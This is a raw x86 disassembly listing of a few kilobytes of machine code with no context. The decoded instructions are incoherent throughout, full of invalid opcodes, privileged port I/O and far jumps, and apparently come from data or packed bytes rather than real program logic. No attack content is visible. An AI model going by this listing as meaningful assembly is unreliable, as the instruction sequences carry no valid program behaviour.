  41ef41:	xor    eax,0xda04de8
  41ef46:	into   
  41ef47:	je     0x41ef19
  41ef49:	call   0x1162ddfc
  41ef4e:	jne    0x41ef42
  41ef50:	inc    ebx
  41ef51:	imul   ebx,DWORD PTR [edx+eax*8],0x44d7d221
  41ef58:	or     cl,al
  41ef5a:	cmp    ebx,DWORD PTR [edx+eiz*4+0x4b685774]
  41ef61:	in     eax,dx
  41ef62:	xor    DWORD PTR [edx-0x1ba146b7],edx
  41ef68:	iret   
  41ef69:	daa    
  41ef6a:	ins    BYTE PTR es:[edi],dx
  41ef6b:	xchg   esp,eax
  41ef6c:	pop    eax
  41ef6d:	daa    
  41ef6e:	shl    DWORD PTR [edi+0x7e],1
  41ef71:	cmp    esi,DWORD PTR [ebx-0x63c111e4]
  41ef77:	inc    ebp
  41ef78:	sub    al,0xaa
  41ef7a:	inc    edi
  41ef7b:	pop    ecx
  41ef7c:	in     al,dx
  41ef7d:	repz mov ecx,?
  41ef80:	jle    0x41efd0
  41ef82:	add    DWORD PTR [esi-0x77],edi
  41ef85:	jmp    0xaeb47103
  41ef8a:	sbb    DWORD PTR [ebx+eax*2],edi
  41ef8d:	(bad)  
  41ef8e:	scas   eax,DWORD PTR es:[edi]
  41ef8f:	test   eax,0x2cc451cf
  41ef94:	jle    0x41ef95
  41ef96:	mov    ebx,0x848b37e
  41ef9b:	lods   al,BYTE PTR ds:[esi]
  41ef9c:	mov    edx,0x2fdde714
  41efa1:	fist   WORD PTR [eax]
  41efa3:	(bad)  
  41efa4:	ins    BYTE PTR es:[edi],dx
  41efa5:	sub    cl,BYTE PTR [edi+0x7a]
  41efa8:	aaa    
  41efa9:	xor    DWORD PTR [ecx-0x3181f486],ecx
  41efaf:	or     BYTE PTR [ebp-0x56c2f932],0x97
  41efb6:	cmp    DWORD PTR [esi],eax
  41efb8:	xlat   BYTE PTR ds:[ebx]
  41efb9:	sbb    ah,dl
  41efbb:	icebp  
  41efbc:	jl     0x41ef68
  41efbe:	shl    BYTE PTR ds:0x14fbc407,cl
  41efc4:	into   
  41efc5:	cs or  edx,ebp
  41efc8:	jp     0x41ef51
  41efca:	inc    esp
  41efcb:	std    
  41efcc:	scas   eax,DWORD PTR es:[edi]
  41efcd:	outs   dx,BYTE PTR ds:[esi]
  41efce:	outs   dx,DWORD PTR ds:[esi]
  41efcf:	add    al,0xa1
  41efd1:	sti    
  41efd2:	cmp    eax,0x8aa77322
  41efd7:	hlt    
  41efd8:	aas    
  41efd9:	push   ebp
  41efda:	mov    ah,0xf8
  41efdd:	bound  ebp,QWORD PTR [edx]
  41efdf:	jecxz  0x41eff2
  41efe1:	adc    BYTE PTR [esi],al
  41efe3:	pop    esi
  41efe4:	or     al,0x94
  41efe6:	ss cmc 
  41efe8:	fld    TBYTE PTR [ebx+0x74]
  41efeb:	ficomp WORD PTR [eax+0x6228f072]
  41eff1:	or     ecx,ebp
  41eff3:	pop    edx
  41eff4:	ror    DWORD PTR [ebx+0x1d],0xe
  41eff8:	or     al,dl
  41effa:	int    0x63
  41effc:	push   ebp
  41effd:	loop   0x41f07b
  41efff:	and    BYTE PTR gs:[ebx+edi*4],ch
  41f003:	shl    BYTE PTR ds:0xe41dfe2a,cl
  41f009:	out    dx,al
  41f00a:	pop    esi
  41f00b:	xchg   ebx,eax
  41f00c:	add    ebp,DWORD PTR [ecx+eiz*4]
  41f00f:	div    ch
  41f011:	pop    es
  41f012:	into   
  41f013:	mov    eax,ds:0x7bb3e62e
  41f018:	cdq    
  41f019:	jle    0x41f007
  41f01b:	adc    al,0xb1
  41f01d:	cmp    dh,dh
  41f01f:	retf   0xb373
  41f022:	pop    ebx
  41f023:	sub    DWORD PTR [esp+edi*4-0x692f95e],0x67
  41f02b:	sbb    ebp,DWORD PTR [edi-0x1f]
  41f02e:	mov    esi,DWORD PTR [ebx-0x3]
  41f031:	or     eax,0xc9670e6d
  41f036:	mov    ecx,0x54a3feac
  41f03b:	icebp  
  41f03c:	into   
  41f03d:	sbb    al,0x8a
  41f03f:	dec    eax
  41f040:	cmp    BYTE PTR cs:[ecx-0x3b],bh
  41f044:	ds (bad) 
  41f046:	stos   BYTE PTR es:[edi],al
  41f047:	cmp    BYTE PTR [eax],bh
  41f049:	jns    0x41f047
  41f04b:	add    ch,BYTE PTR [eax+0x22]
  41f04e:	out    0xa7,eax
  41f050:	xchg   ebx,eax
  41f051:	cmp    BYTE PTR [edx-0x42afbb1c],al
  41f057:	xor    al,0x0
  41f059:	(bad)  
  41f05a:	nop
  41f05b:	into   
  41f05c:	test   al,0x41
  41f05e:	push   eax
  41f05f:	ret    0x94c2
  41f062:	(bad)  
  41f063:	cmp    al,0x11
  41f065:	mov    WORD PTR [edx+0x7672c443],fs
  41f06b:	sbb    al,0x9
  41f06d:	jge    0x41f003
  41f06f:	or     eax,0x50eff9ac
  41f074:	cmp    DWORD PTR [ebp-0x69],edx
  41f077:	push   ecx
  41f078:	test   DWORD PTR [ebp-0x4688cfe5],edx
  41f07e:	xchg   edi,eax
  41f07f:	in     al,dx
  41f080:	cdq    
  41f081:	not    BYTE PTR [ebx+0x24]
  41f084:	outs   dx,BYTE PTR ds:[esi]
  41f085:	retf   
  41f086:	mov    ds:0xd567ea82,al
  41f08b:	(bad)  
  41f08d:	add    eax,DWORD PTR [edi+0x3]
  41f090:	ins    DWORD PTR es:[edi],dx
  41f091:	mov    eax,0x73eb5a61
  41f096:	xchg   ebx,eax
  41f097:	mov    dl,0xe2
  41f099:	push   eax
  41f09a:	mov    esi,0xaf498e41
  41f09f:	dec    bp
  41f0a1:	out    0xbb,eax
  41f0a3:	push   cs
  41f0a4:	pusha  
  41f0a5:	push   0x69d62c3f
  41f0aa:	lods   al,BYTE PTR ds:[esi]
  41f0ab:	jnp    0x41f10a
  41f0ad:	ror    DWORD PTR [edx-0x1d],1
  41f0b0:	icebp  
  41f0b1:	adc    esp,ecx
  41f0b3:	fwait
  41f0b4:	test   DWORD PTR [edx],esp
  41f0b6:	int3   
  41f0b7:	mov    ah,0x9f
  41f0b9:	fnsave [ecx+0x41e2adaf]
  41f0bf:	stos   BYTE PTR es:[edi],al
  41f0c0:	dec    edi
  41f0c1:	push   ebp
  41f0c2:	stos   DWORD PTR es:[edi],eax
  41f0c3:	pop    ds
  41f0c4:	fsubr  st(6),st
  41f0c6:	stos   DWORD PTR es:[edi],eax
  41f0c7:	push   0x30a1faa9
  41f0cc:	stc    
  41f0cd:	pop    edi
  41f0ce:	or     BYTE PTR [ecx+0x771b6bbd],bh
  41f0d4:	cwde   
  41f0d5:	adc    BYTE PTR [edx],ch
  41f0d7:	pop    ax
  41f0d9:	fwait
  41f0da:	and    BYTE PTR [eax],dl
  41f0dc:	out    dx,al
  41f0dd:	mov    ecx,0x8469f53
  41f0e2:	cli    
  41f0e3:	mov    ds:0x1cba75bc,al
  41f0e8:	sub    DWORD PTR [ebx],edi
  41f0ea:	dec    ebp
  41f0eb:	and    esi,edx
  41f0ed:	cmp    ch,dl
  41f0ef:	ret    0xd090
  41f0f2:	retf   
  41f0f3:	scas   al,BYTE PTR es:[edi]
  41f0f4:	cli    
  41f0f5:	xchg   BYTE PTR [ebp-0xd],dl
  41f0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0f9:	mov    ds:0x99d3dc41,eax
  41f0fe:	sbb    dl,dl
  41f100:	int    0x24
  41f102:	inc    esi
  41f103:	mov    ds:0x881e7870,eax
  41f108:	inc    esi
  41f109:	sbb    eax,0xe65f0f3e
  41f10e:	or     BYTE PTR [edi-0x4c],dl
  41f111:	push   ss
  41f112:	rcl    BYTE PTR [ecx+0x1e],cl
  41f115:	push   edi
  41f116:	push   ss
  41f117:	mov    ds:0xc8d6a450,eax
  41f11c:	jbe    0x41f0c9
  41f11e:	xchg   edi,eax
  41f11f:	and    eax,DWORD PTR [ebx]
  41f121:	outs   dx,BYTE PTR ds:[esi]
  41f122:	pop    eax
  41f123:	push   ebx
  41f124:	add    eax,0xbc9d35de
  41f129:	pop    ebp
  41f12a:	in     eax,0xb4
  41f12c:	test   BYTE PTR [ecx],0x7
  41f12f:	cmp    BYTE PTR [esi],ah
  41f131:	pop    ebx
  41f132:	jns    0x41f0cb
  41f134:	sub    DWORD PTR [ebx-0x37],esi
  41f137:	dec    esi
  41f138:	inc    sp
  41f13a:	icebp  
  41f13b:	pop    ebx
  41f13c:	rcr    DWORD PTR [ecx],1
  41f13e:	in     eax,0x81
  41f140:	jbe    0x41f1ae
  41f142:	inc    eax
  41f143:	adc    BYTE PTR [ebp+ebx*8+0x2a],bl
  41f147:	or     BYTE PTR [eax-0x3b759293],dl
  41f14d:	sub    eax,0x7278d765
  41f152:	sub    DWORD PTR [edx+0x25],0xffffffd3
  41f156:	push   edx
  41f157:	sub    eax,0x501eff44
  41f15c:	sub    al,0x71
  41f15e:	in     al,dx
  41f15f:	in     al,0x43
  41f161:	dec    eax
  41f162:	fist   DWORD PTR [ebx-0x11]
  41f165:	cmp    BYTE PTR [ecx+edi*1-0x61],ah
  41f169:	fcomp  QWORD PTR [ebx+0x1ee7bd3]
  41f16f:	lea    edx,[eax+0x7c2fa1eb]
  41f175:	aas    
  41f176:	jns    0x41f169
  41f178:	je     0x41f15e
  41f17a:	es jns 0x41f147
  41f17d:	sub    al,0xdc
  41f17f:	fwait
  41f180:	cli    
  41f181:	sub    DWORD PTR [edi+ecx*4+0xd],esp
  41f185:	xchg   al,bl
  41f187:	int    0x84
  41f189:	in     eax,0xad
  41f18b:	das    
  41f18c:	jp     0x41f122
  41f18e:	hlt    
  41f18f:	jl     0x41f1bc
  41f191:	or     eax,0x40e6573c
  41f196:	cmp    eax,0x31c205d2
  41f19b:	inc    edx
  41f19c:	fild   WORD PTR ds:0xc834cea2
  41f1a2:	repnz (bad) 
  41f1a5:	push   es
  41f1a6:	jmp    0xb0fc:0x122d4b49
  41f1ad:	lds    edi,FWORD PTR [eax+0xbeeebac]
  41f1b3:	adc    bl,BYTE PTR [esi+eax*1+0x2ffb2a40]
  41f1ba:	push   ebx
  41f1bb:	and    esp,esi
  41f1bd:	push   eax
  41f1be:	dec    eax
  41f1bf:	fs mov eax,ds:0x2978d348
  41f1c6:	inc    ecx
  41f1c7:	scas   al,BYTE PTR es:[edi]
  41f1c8:	test   al,0xc7
  41f1ca:	fsub   QWORD PTR [eax]
  41f1cc:	dec    ebx
  41f1cd:	std    
  41f1ce:	cmp    al,BYTE PTR [ecx+0x4669874]
  41f1d4:	sub    al,0x49
  41f1d6:	xchg   esp,eax
  41f1d7:	invd   
  41f1d9:	call   0xb93f:0xec558d3b
  41f1e0:	inc    ax
  41f1e2:	or     DWORD PTR [eax+0x32],esp
  41f1e5:	loope  0x41f188
  41f1e7:	retf   0x711f
  41f1ea:	inc    ebx
  41f1eb:	cmp    DWORD PTR [esi+0x20],edx
  41f1ee:	or     eax,0xb532abaf
  41f1f3:	pop    edx
  41f1f4:	test   dh,cl
  41f1f6:	leave  
  41f1f7:	mov    ecx,0x220baed9
  41f1fc:	or     ebx,DWORD PTR [esi-0x182738c3]
  41f202:	repnz (bad)
  41f205:	sbb    al,0x42
  41f207:	pop    ds
  41f208:	mov    ah,BYTE PTR [esi+0x53]
  41f20b:	fnstsw WORD PTR [esi+0x2b]
  41f20e:	cld    
  41f20f:	scas   eax,DWORD PTR es:[edi]
  41f210:	daa    
  41f211:	lahf   
  41f212:	sbb    BYTE PTR [ebx-0x4d],bh
  41f215:	or     eax,0x3bada641
  41f21a:	(bad)  
  41f21b:	jb     0x41f1f4
  41f21d:	xchg   edx,eax
  41f21e:	mov    dh,0x97
  41f220:	pop    esp
  41f221:	data16 int 0xa6
  41f224:	dec    ecx
  41f225:	div    ah
  41f227:	inc    edi
  41f228:	(bad)  
  41f229:	ins    DWORD PTR es:[edi],dx
  41f22a:	addr16 pop ebx
  41f22c:	sbb    ch,BYTE PTR [eax]
  41f22e:	xchg   edx,eax
  41f22f:	scas   eax,DWORD PTR es:[edi]
  41f230:	out    dx,al
  41f231:	in     eax,0xd3
  41f233:	fadd   QWORD PTR [ebx+0x7765fba1]
  41f239:	or     DWORD PTR [ebx],esp
  41f23b:	mov    ds:0xb856b9fc,eax
  41f240:	sub    DWORD PTR [esi-0x105e313e],ebx
  41f246:	xchg   edx,eax
  41f247:	inc    eax
  41f248:	or     eax,0x4a5cef34
  41f24d:	es mov cl,0x6f
  41f250:	rol    edi,1
  41f252:	or     al,0x38
  41f254:	mov    dh,0x4e
  41f256:	int3   
  41f257:	std    
  41f258:	in     eax,0x4c
  41f25a:	call   0xc7cf:0x2e467c8f
  41f261:	inc    ebp
  41f262:	pop    ebx
  41f263:	scas   al,BYTE PTR es:[edi]
  41f264:	dec    edi
  41f265:	xchg   BYTE PTR [ebp+0x46],ch
  41f268:	cmp    ebp,DWORD PTR [esi-0x1c564833]
  41f26e:	mov    edi,0x7ca33644
  41f273:	xchg   edi,eax
  41f274:	mov    esp,fs
  41f276:	loop   0x41f1f8
  41f278:	mov    bl,0x15
  41f27a:	sub    eax,0x9d68d6ca
  41f27f:	jmp    0x77546eca
  41f284:	imul   esi,DWORD PTR [eax+0x455bd936],0x24
  41f28b:	dec    ebp
  41f28c:	xor    eax,0x308b339f
  41f291:	stos   BYTE PTR es:[edi],al
  41f292:	mov    edx,0xd6de4541
  41f297:	mov    dh,0x51
  41f299:	clc    
  41f29a:	ret    
  41f29b:	add    ebp,DWORD PTR [esi-0x4392ed99]
  41f2a1:	inc    ebp
  41f2a2:	jne    0x41f257
  41f2a4:	mov    WORD PTR [ebx-0x29],es
  41f2a7:	xor    eax,0xa15d4ca7
  41f2ac:	test   ebx,0x34f8b79d
  41f2b2:	add    DWORD PTR ds:0x401c895d,0xffc42fd4
  41f2bc:	pop    es
  41f2bd:	ins    BYTE PTR es:[edi],dx
  41f2be:	call   0xbb36:0x37bdfb21
  41f2c5:	mov    cl,0x4d
  41f2c7:	sub    BYTE PTR [eax-0x1f],ah
  41f2ca:	cmp    BYTE PTR ds:0x8e39a011,dh
  41f2d0:	es popa 
  41f2d2:	jmp    0x41f335
  41f2d4:	aad    0x8a
  41f2d6:	inc    edi
  41f2d7:	and    ebp,DWORD PTR ss:[esi+0x35]
  41f2db:	out    0xcf,eax
  41f2dd:	or     DWORD PTR [ecx],esi
  41f2df:	mov    ch,0x89
  41f2e1:	mov    esi,0x73d1ef8c
  41f2e6:	icebp  
  41f2e7:	jo     0x41f2c8
  41f2e9:	imul   esp,DWORD PTR [esi-0x2b49884a],0x1183b9e6
  41f2f3:	cmp    ah,BYTE PTR [edi]
  41f2f5:	cs dec esi
  41f2f7:	xor    esp,DWORD PTR [esi+0x283d2b9a]
  41f2fd:	pop    ebx
  41f2fe:	fiadd  WORD PTR [ecx-0x1b1a08a6]
  41f304:	cld    
  41f305:	mov    edx,0xed75eade
  41f30a:	adc    ecx,DWORD PTR [ecx+0x41c4a980]
  41f310:	xor    edi,DWORD PTR [edi+0x70]
  41f313:	repz adc edx,esp
  41f316:	pop    ds
  41f317:	sar    BYTE PTR gs:[edi+0x7b7e3600],0x63
  41f31f:	add    ch,BYTE PTR [esi]
  41f321:	mov    esi,0x510f6c4a
  41f326:	xor    ch,BYTE PTR [ebx+edx*1-0x44]
  41f32a:	fcom   DWORD PTR [edi+eiz*1]
  41f32d:	rcl    DWORD PTR [ebx-0x3ba89ab4],0x2
  41f334:	jae    0x41f30d
  41f336:	xor    ch,BYTE PTR [eax]
  41f338:	or     ch,BYTE PTR [ebx*8-0x3f74ee9c]
  41f33f:	cmp    al,0x6e
  41f341:	mov    ah,0x56
  41f343:	fs mov esi,0x85d84b81
  41f349:	push   ecx
  41f34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34b:	call   0xf0d3b2ee
  41f350:	adc    BYTE PTR [esp+edi*2+0x2cce4074],bl
  41f357:	mov    ah,0x4e
  41f359:	shl    DWORD PTR [esi+0xc9cb840],0xf6
  41f360:	test   bh,dl
  41f362:	adc    al,0xa3
  41f364:	jg     0x41f3a4
  41f366:	jno    0x41f3a9
  41f368:	xor    BYTE PTR [eax-0x70],ch
  41f36b:	nop
  41f36c:	pop    ss
  41f36d:	ss xor al,dh
  41f370:	or     al,0x69
  41f372:	and    al,bh
  41f374:	dec    edi
  41f375:	push   es
  41f376:	lea    ecx,[edx-0x77]
  41f379:	aaa    
  41f37a:	cmp    eax,0x50892ae0
  41f37f:	frstor [esi-0x55745468]
  41f385:	lea    esp,[esi]
  41f387:	fisttp QWORD PTR [edx-0x3724fba3]
  41f38d:	xor    BYTE PTR [ebp-0x30],bl
  41f390:	mov    ecx,0xda6d7278
  41f395:	sbb    eax,0xcaab435b
  41f39a:	mov    ecx,DWORD PTR [ecx]
  41f39c:	pushf  
  41f39d:	sbb    ebp,eax
  41f39f:	int3   
  41f3a0:	jo     0x41f3fc
  41f3a2:	in     al,dx
  41f3a3:	xor    bh,BYTE PTR [ebx+ebp*4]
  41f3a6:	test   eax,0xa1a253f
  41f3ab:	cmc    
  41f3ac:	xor    BYTE PTR [ecx+ebp*2-0x4c],0x1e
  41f3b1:	out    0xdd,al
  41f3b3:	lods   eax,DWORD PTR ds:[esi]
  41f3b4:	aad    0xad
  41f3b6:	or     esi,ebx
  41f3b8:	sub    DWORD PTR ds:0x5a5c3c4a,ecx
  41f3be:	inc    edi
  41f3bf:	fsincos 
  41f3c1:	call   0xb2ad:0xc7188bef
  41f3c8:	add    DWORD PTR ds:0x721a4866,edx
  41f3ce:	inc    esi
  41f3cf:	sbb    eax,0x40caa58b
  41f3d4:	or     DWORD PTR [eax-0x7b],edi
  41f3d7:	jle    0x41f3ea
  41f3d9:	jae    0x41f3f7
  41f3db:	repz cmp bh,BYTE PTR [ecx+0xb]
  41f3df:	xchg   edx,eax
  41f3e0:	pop    ebx
  41f3e1:	hlt    
  41f3e2:	xor    eax,0xf8d4a906
  41f3e7:	mov    bh,0x16
  41f3e9:	cmp    al,0x41
  41f3eb:	dec    eax
  41f3ec:	das    
  41f3ed:	stos   DWORD PTR es:[edi],eax
  41f3ee:	jecxz  0x41f44d
  41f3f0:	loop   0x41f3e9
  41f3f2:	sbb    ch,BYTE PTR [eax]
  41f3f4:	xchg   ebx,eax
  41f3f5:	xor    al,0x4
  41f3f7:	cwde   
  41f3f8:	add    dh,0x91
  41f3fb:	dec    esi
  41f3fc:	add    DWORD PTR [ecx-0x76],edi
  41f3ff:	sbb    al,dh
  41f401:	test   al,0x4e
  41f403:	lea    ebp,[edx]
  41f405:	(bad)  
  41f407:	mov    edi,DWORD PTR [edi-0x54]
  41f40a:	push   ds
  41f40b:	das    
  41f40c:	fcomip st,st(0)
  41f40e:	stos   DWORD PTR es:[edi],eax
  41f40f:	or     BYTE PTR [edi],0x38
  41f412:	ins    DWORD PTR es:[edi],dx
  41f413:	xchg   ebx,eax
  41f414:	adc    al,0x67
  41f416:	sahf   
  41f417:	xchg   edi,eax
  41f418:	inc    ecx
  41f419:	rcl    bl,0xf1
  41f41c:	inc    ebp
  41f41d:	xor    ecx,esp
  41f41f:	scas   eax,DWORD PTR es:[edi]
  41f420:	sub    cl,ah
  41f422:	xchg   ecx,eax
  41f423:	fdivp  st(5),st
  41f425:	(bad)  
  41f426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f427:	enter  0x3191,0x4f
  41f42b:	sbb    ebx,esp
  41f42d:	leave  
  41f42e:	fnstsw WORD PTR [edx-0x5]
  41f431:	adc    al,0x2
  41f433:	or     edx,0xf2bc7057
  41f439:	cmp    DWORD PTR [esi],0xf0d50018
  41f43f:	xchg   ebp,eax
  41f440:	xchg   edi,eax
  41f441:	test   BYTE PTR [ebp-0x71],ah
  41f444:	es out 0xae,al
  41f447:	test   edx,edx
  41f449:	sar    dh,0xeb
  41f44c:	jb     0x41f472
  41f44e:	das    
  41f44f:	and    DWORD PTR [eiz*4+0x7ec1f30d],edx
  41f456:	sbb    al,0x35
  41f458:	xor    al,0x38
  41f45a:	and    al,0xd0
  41f45c:	and    ecx,edx
  41f45e:	pop    ebx
  41f45f:	outs   dx,BYTE PTR ds:[esi]
  41f460:	sti    
  41f461:	jge    0x41f475
  41f463:	adc    al,0x51
  41f465:	sub    bl,BYTE PTR [eax+0x372295ed]
  41f46b:	pushf  
  41f46c:	or     ah,BYTE PTR [ebx-0x36]
  41f46f:	scas   al,BYTE PTR es:[edi]
  41f470:	mov    ebp,0xdc3345
  41f475:	addr16 dec edx
  41f477:	mov    bh,0x13
  41f479:	push   cs
  41f47a:	xchg   ebp,eax
  41f47b:	ror    DWORD PTR [edx+0x42],1
  41f47e:	jp     0x41f4e5
  41f480:	mov    cl,0xf7
  41f482:	pop    eax
  41f483:	jo     0x41f4c5
  41f485:	mov    bh,0xf0
  41f487:	daa    
  41f488:	int    0x2c
  41f48a:	sbb    al,0x3c
  41f48c:	(bad)  
  41f48d:	stos   DWORD PTR es:[edi],eax
  41f48e:	das    
  41f48f:	in     al,dx
  41f490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f491:	lea    ecx,[esi+0x6]
  41f494:	es bound eax,QWORD PTR ds:[esi]
  41f498:	aas    
  41f499:	jecxz  0x41f420
  41f49b:	mov    edi,0xa151c976
  41f4a0:	test   eax,0x9713814b
  41f4a5:	retf   0x5934
  41f4a8:	xchg   BYTE PTR [edx],dl
  41f4aa:	shr    DWORD PTR [esi-0x3f99bec],0xbe
  41f4b1:	fistp  DWORD PTR [esi+ebx*1]
  41f4b4:	mov    cl,0x33
  41f4b6:	test   eax,0xfddd796e
  41f4bb:	ins    BYTE PTR es:[edi],dx
  41f4bc:	push   esi
  41f4bd:	pop    ebx
  41f4be:	mov    edi,0x413e40c4
  41f4c3:	(bad)  
  41f4c4:	push   cs
  41f4c5:	fs dec ebx
  41f4c7:	popa   
  41f4c8:	cs add eax,0x4dca7c3b
  41f4ce:	jae    0x41f536
  41f4d0:	sbb    bl,cl
  41f4d2:	in     eax,0xbb
  41f4d4:	pop    ebp
  41f4d5:	add    al,0xc3
  41f4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4d8:	neg    BYTE PTR [esp+ecx*4]
  41f4db:	fwait
  41f4dc:	dec    ebx
  41f4dd:	aas    
  41f4de:	mov    ds:0x93885d39,al
  41f4e3:	or     BYTE PTR ds:0x5202191d,bl
  41f4e9:	jns    0x41f46e
  41f4eb:	neg    DWORD PTR [eax+0x71e3b395]
  41f4f1:	into   
  41f4f2:	mov    ebx,0xc5fca70e
  41f4f7:	jno    0x41f54d
  41f4f9:	cmp    BYTE PTR [edi-0x3e],dl
  41f4fc:	pop    ecx
  41f4fd:	outs   dx,BYTE PTR ds:[esi]
  41f4fe:	xchg   edi,eax
  41f4ff:	call   0x2f444ef3
  41f504:	cwde   
  41f505:	pop    esp
  41f506:	pop    esp
  41f507:	aas    
  41f508:	fcomp  DWORD PTR [ebx+0x3]
  41f50b:	les    ebp,FWORD PTR [ecx]
  41f50d:	inc    ecx
  41f50e:	in     eax,dx
  41f50f:	pop    esp
  41f510:	add    BYTE PTR [edi+0x46fae2e3],0xb8
  41f517:	cs stos BYTE PTR es:[edi],al
  41f519:	and    al,0xde
  41f51b:	adc    dl,dh
  41f51d:	std    
  41f51e:	inc    edx
  41f51f:	sbb    esi,esi
  41f521:	jge    0x41f50e
  41f523:	dec    edx
  41f524:	retf   0x6d93
  41f527:	out    0xb2,al
  41f529:	jmp    0xf445:0xdde49d41
  41f530:	out    dx,eax
  41f531:	enter  0xbf9a,0xb7
  41f535:	xchg   DWORD PTR [edx+esi*8],esp
  41f538:	rep ins BYTE PTR es:[edi],dx
  41f53a:	in     al,0x9e
  41f53c:	cdq    
  41f53d:	mov    esp,cr5
  41f540:	es mov eax,0x24256fab
  41f546:	or     DWORD PTR [eax-0x3b2a6563],eax
  41f54c:	call   0xb54:0xc2a26f3c
  41f553:	push   es
  41f554:	lods   eax,DWORD PTR ds:[esi]
  41f555:	aaa    
  41f556:	add    al,0x56
  41f558:	fist   DWORD PTR [ecx]
  41f55a:	sahf   
  41f55b:	stos   DWORD PTR es:[edi],eax
  41f55c:	add    ch,ch
  41f55e:	adc    BYTE PTR [esi-0x5f],dl
  41f561:	je     0x41f512
  41f563:	push   eax
  41f564:	xor    al,0x45
  41f566:	dec    esp
  41f567:	gs inc eax
  41f569:	pushf  
  41f56a:	sub    BYTE PTR [edx+ecx*2],ch
  41f56d:	in     eax,0x30
  41f56f:	xor    eax,0x4619664b
  41f574:	adc    ecx,DWORD PTR [edx]
  41f576:	outs   dx,BYTE PTR ds:[esi]
  41f577:	inc    eax
  41f578:	mov    esp,0xdba20ba
  41f57d:	idiv   esi
  41f57f:	pop    es
  41f580:	shl    BYTE PTR [ecx-0x39c5c19c],1
  41f586:	pop    eax
  41f587:	jns    0x41f541
  41f589:	lds    ebp,FWORD PTR [ebp+0x6232c32e]
  41f58f:	sbb    al,0x12
  41f591:	inc    ebx
  41f592:	cmp    eax,0x46fd67a
  41f597:	adc    BYTE PTR [edi+0x22],cl
  41f59a:	les    ebp,FWORD PTR [esp+eiz*2+0x13]
  41f59e:	mov    eax,ds:0xe5eee728
  41f5a3:	enter  0x30a7,0x46
  41f5a7:	mov    ch,0x87
  41f5a9:	es pusha 
  41f5ab:	add    dl,bl
  41f5ad:	xor    ch,cl
  41f5af:	push   ds
  41f5b0:	cmp    al,0xaf
  41f5b2:	inc    edx
  41f5b3:	retf   0x7e0f
  41f5b6:	adc    eax,0x9f4fe3d6
  41f5bb:	ret    0x4e6b
  41f5be:	add    eax,0x196f6695
  41f5c3:	or     ecx,eax
  41f5c5:	pop    eax
  41f5c6:	ror    edx,cl
  41f5c8:	adc    al,0x3
  41f5ca:	pop    ss
  41f5cb:	shl    esp,1
  41f5cd:	sar    DWORD PTR ds:0x635d7e43,1
  41f5d3:	std    
  41f5d4:	or     dl,al
  41f5d6:	test   al,0x60
  41f5d8:	enter  0x2fb2,0x39
  41f5dc:	cmp    BYTE PTR [ebp-0x13baec8b],al
  41f5e2:	mov    ecx,ebp
  41f5e4:	or     al,0xb8
  41f5e6:	aad    0x4b
  41f5e8:	call   0xbd43:0xd0c39ffa
  41f5ef:	lods   al,BYTE PTR ds:[esi]
  41f5f0:	ins    DWORD PTR es:[edi],dx
  41f5f1:	pop    ebx
  41f5f2:	mov    eax,ds:0xe7ad2f61
  41f5f7:	xchg   ebx,eax
  41f5f8:	cmp    ch,al
  41f5fa:	mov    ebx,0x8f0026a7
  41f5ff:	cmp    al,0x77
  41f601:	imul   ecx,eax,0x2b
  41f604:	inc    edx
  41f605:	ins    BYTE PTR es:[edi],dx
  41f606:	and    al,0xce
  41f608:	jns    0x41f638
  41f60a:	cmp    eax,DWORD PTR [edx+0x1c51f152]
  41f610:	jg     0x41f61f
  41f612:	pop    edi
  41f613:	sbb    DWORD PTR [edi+0x11],0xba61852a
  41f61a:	dec    eax
  41f61b:	retf   
  41f61c:	ins    BYTE PTR es:[edi],dx
  41f61d:	sbb    al,0x63
  41f61f:	mov    ebp,0x82d4beae
  41f624:	pop    ss
  41f625:	hlt    
  41f626:	sbb    al,0xe6
  41f628:	push   esp
  41f629:	lock or eax,0xdd60c93a
  41f62f:	or     al,0xe9
  41f631:	lea    ecx,[edi]
  41f633:	fldenv [esi+0x7ae62a47]
  41f639:	in     al,dx
  41f63a:	sbb    ebp,eax
  41f63c:	in     al,0xc5
  41f63e:	cmp    ebp,esp
  41f640:	mov    al,ds:0x4ccb3547
  41f645:	in     eax,dx
  41f646:	dec    ebx
  41f647:	jl     0x41f650
  41f649:	lea    edi,ds:0xade77121
  41f64f:	in     al,dx
  41f650:	cdq    
  41f651:	dec    esp
  41f652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f653:	push   esi
  41f654:	or     BYTE PTR [ebp+0x57d4f67b],0x96
  41f65b:	dec    ecx
  41f65c:	retf   
  41f65d:	clc    
  41f65e:	sub    edx,DWORD PTR [ebx+eax*2+0x1e9e95d8]
  41f665:	add    ah,BYTE PTR [eax-0x63]
  41f668:	iret   
  41f669:	mov    ebp,0x73d85517
  41f66e:	lea    ebx,[ecx-0x77f4ea6f]
  41f674:	int    0x55
  41f676:	aaa    
  41f677:	sbb    ebx,DWORD PTR [edi]
  41f679:	jb     0x41f629
  41f67b:	cdq    
  41f67c:	and    edi,DWORD PTR [edx]
  41f67e:	mul    edi
  41f680:	retf   0xba5a
  41f683:	sahf   
  41f684:	dec    ecx
  41f685:	scas   eax,DWORD PTR es:[edi]
  41f686:	adc    ebp,DWORD PTR [esi+0x75aad522]
  41f68c:	int3   
  41f68d:	push   esp
  41f68e:	xchg   edx,eax
  41f68f:	mov    ebx,0x826f6fbb
  41f694:	sub    ch,BYTE PTR [ebp-0x1d]
  41f697:	retf   0xddbb
  41f69a:	mov    ds:0xcb814842,eax
  41f69f:	sub    esp,DWORD PTR [ebx-0x76404799]
  41f6a5:	das    
  41f6a6:	jmp    0x10a578db
  41f6ab:	nop
  41f6ac:	xchg   edx,eax
  41f6ad:	dec    ebp
  41f6ae:	xchg   ebx,eax
  41f6af:	inc    ebp
  41f6b0:	out    0x20,al
  41f6b2:	aas    
  41f6b3:	mov    al,ds:0x6a9bf0fa
  41f6b8:	test   al,0x98
  41f6ba:	fimul  WORD PTR [ecx]
  41f6bc:	pop    eax
  41f6bd:	push   ecx
  41f6be:	stc    
  41f6bf:	pop    ss
  41f6c0:	xor    ebp,DWORD PTR [ebp+0x57]
  41f6c3:	pop    ebp
  41f6c4:	adc    al,0x72
  41f6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6c7:	or     eax,0x692d5d59
  41f6cc:	retw   
